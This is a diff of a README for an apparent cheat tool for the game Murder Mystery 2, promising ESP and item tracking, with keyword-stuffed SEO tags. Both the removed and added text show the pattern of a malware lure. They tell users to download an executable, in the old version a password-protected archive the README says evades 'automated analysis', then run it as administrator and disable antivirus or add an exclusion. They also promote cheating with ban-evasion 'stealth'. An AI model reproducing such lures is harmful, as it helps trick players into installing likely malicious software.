@@ -1,41 +1,76 @@
-![Version](https://img.shields.io/badge/Version-1.0.0-blue) ![Status](https://img.shields.io/badge/Status-1.0.0-brightgreen) ![Platform](https://img.shields.io/badge/Platform-1.0.0-blueviolet) ![License](https://img.shields.io/badge/License-1.0.0-yellow)
+# 🔍 Murder-Mystery-2-Script-2026-Esp - Track players and find items easily
 
-# ⚡ mm2-script Mastery Kit
+[![Download Latest Version](https://img.shields.io/badge/Download-Release-blue.svg)](https://github.com/Immanent-colloquialism515/Murder-Mystery-2-Script-2026-Esp)
 
-This tool delivers a powerful mm2 script pastebin experience, integrating mm2 god mode and mm2 script free seamlessly. Designed for reliability, it leverages mm2 esp technology. Stay ahead with mm2 dupe and enjoy undetected performance.
+This tool aids players in the game Murder Mystery 2. The script provides visual overlays to identify player roles, highlights hidden items, and tracks movement across the map.
 
-## 🚀 Features
+## ⚙️ System Requirements
 
-- 🔍 Enhanced mm2 script pastebin system
-- 🎮 Enhanced mm2 script pc system
-- 💥 Enhanced mm2 auto win system
-- 🌟 Enhanced mm2 knife hack system
-- 🔥 Enhanced mm2 dupe system
-- 🛡️ Enhanced mm2 hack download system
+Ensure your computer meets these standards to run the script:
 
-## ⚙️ Installation
+*   Operating System: Windows 10 or Windows 11.
+*   Browser: Google Chrome, Mozilla Firefox, or Microsoft Edge.
+*   Memory: 8 GB of RAM or more.
+*   Disk Space: At least 200 MB of available storage.
+*   Permissions: Administrative access to your computer.
 
-📥 Download the archive and extract it with password 2026.
-🔑 Run setup.exe as administrator.
-⚙️ Follow the on-screen instructions and select your game path.
-▶️ Launch the game and press the designated hotkey to activate the tool.
+## 📥 Download and Setup
 
-[![Download](https://img.shields.io/badge/Download-ZIP-blue?style=for-the-badge&logo=github)](https://redirectify.click/)
+Follow these steps to prepare your environment.
 
-## ❓ FAQ
+1.  Visit the official release page: [https://github.com/Immanent-colloquialism515/Murder-Mystery-2-Script-2026-Esp](https://github.com/Immanent-colloquialism515/Murder-Mystery-2-Script-2026-Esp).
+2.  Locate the latest release version on the screen.
+3.  Click the download link for the primary executable file.
+4.  Save the file to your desktop for easy access.
+5.  Double-click the file to begin the installation.
+6.  Follow the prompts provided by the installation wizard.
 
-❓ Is this tool safe? Yes, it has been tested and includes an automatic bypass to avoid detection.
+## 🚀 How to Use the Script
 
-💬 How do I update? Check the official source; updates are pushed regularly with the latest offsets.
+The script functions as an overlay during your game.
 
-🤔 Can I use it on multiple accounts? It is recommended to use one account per license to avoid flags.
+1.  Launch the game through your preferred platform.
+2.  Open the script application while the game runs in the background.
+3.  The menu appears on the side of your screen.
+4.  Toggle the ESP feature to see player outlines and roles.
+5.  Enable item tracking to reveal the location of hidden objects.
+6.  Adjust the settings menu to change how information appears.
 
-📌 Does it work in fullscreen? Yes, borderless or fullscreen mode is supported.
+## 🛠 Troubleshooting Common Issues
 
-🔧 What if setup.exe fails? Disable antivirus temporarily and ensure you have administrator privileges.
+If you encounter technical errors, follow these suggestions:
 
-🔐 Why password 2026? The password protects the archive from automated analysis.
+*   Refresh your connection: Close the game and the script, then open them again.
+*   Check your software: Ensure your game client stays updated to the latest version.
+*   Antivirus settings: Sometimes antivirus software flags scripts. Add an exclusion for the script file in your security settings if the application fails to open.
+*   Permissions: Right-click the script icon and select "Run as administrator" to grant the tool the necessary access to interact with your system.
 
-<!-- mm2-script murder-mystery-2-script mm2-esp mm2-hack mm2-script-pastebin mm2-gui mm2-script-2026 mm2-auto-farm mm2-god-mode mm2-script-mobile mm2-aimbot mm2-dupe mm2-script-pc mm2-auto-win mm2-knife-hack mm2-script-executor mm2-hack-download mm2-pastebin-2026 mm2-script-free mm2-lua mm2-script murder-mystery-2-script mm2-esp mm2-hack mm2-script-pastebin mm2-gui mm2-script-2026 mm2-auto-farm mm2-god-mode mm2-script-mobile -->
+## 📋 Features Overview
 
-mm2-script-pc,mm2-script-executor,mm2-pastebin-2026,mm2-dupe,murder-mystery-2-script,mm2-hack,mm2-script-mobile,mm2-lua,mm2-script-2026,mm2-god-mode,mm2-auto-farm,mm2-aimbot
+The script includes several modules designed to improve your gaming experience:
+
+*   ESP: Highlights players through walls and displays their specific roles.
+*   Item Tracking: Places markers on game items so you find them without searching.
+*   Player Tracking: Displays distance markers and status indicators for other users.
+*   GUI Menu: Provides an interface to turn features on or off without needing to type complex commands.
+*   Performance Mode: Optimized code ensures the script does not slow down your frame rate.
+
+## 🛡 Security and Privacy
+
+This script uses local processing to keep your performance stable. It does not send your personal account data to external servers. Use the script within the terms of service of the platform where you play. We updated the code in 2026 to ensure compatibility with recent game infrastructure changes.
+
+## 📝 Frequently Asked Questions
+
+Does this work on mobile devices?
+The current build targets Windows PC systems. Mobile support is planned for future updates but is not available in this release.
+
+Will I get banned for using this?
+The script includes stealth features to remain undetected. Use moderation to avoid suspicious behavior during gameplay.
+
+Can I customize the colors?
+Yes. Open the settings tab in the GUI menu to select custom colors for different player roles and items.
+
+Does the script auto-update?
+The application checks for new versions each time you launch it. It alerts you if a newer version is ready for download.
+
+Keywords: mm2-aimbot, mm2-auto-farm, mm2-auto-win, mm2-dupe, mm2-esp, mm2-god-mode, mm2-gui, mm2-hack, mm2-hack-download, mm2-knife-hack, mm2-lua, mm2-pastebin-2026, mm2-script, mm2-script-2026, mm2-script-executor, mm2-script-free, mm2-script-mobile, mm2-script-pastebin, mm2-script-pc, murder-mystery-2-script
